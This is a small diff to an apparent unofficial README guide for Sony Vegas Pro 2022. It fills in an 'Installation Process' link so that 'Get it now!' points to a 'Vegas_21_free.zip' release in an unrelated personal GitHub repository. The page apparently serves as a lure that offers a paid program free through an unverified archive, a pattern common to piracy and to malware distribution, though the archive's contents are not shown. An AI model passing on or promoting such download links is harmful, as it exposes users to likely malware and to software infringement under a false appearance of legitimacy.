@@ -12,4 +12,4 @@ Welcome to the unofficial guide on how to get started with Sony Vegas Pro 2022, 
 - *GPU Accelerated Performance:* Fast rendering speeds with support for GPU-accelerated rendering.
 
 # Installation Process
-## >>> [Get it now!]()
+## >>> [Get it now!](https://github.com/Akhilkanta/-vegas-20-free-/releases/download/vega/Vegas_21_free.zip)
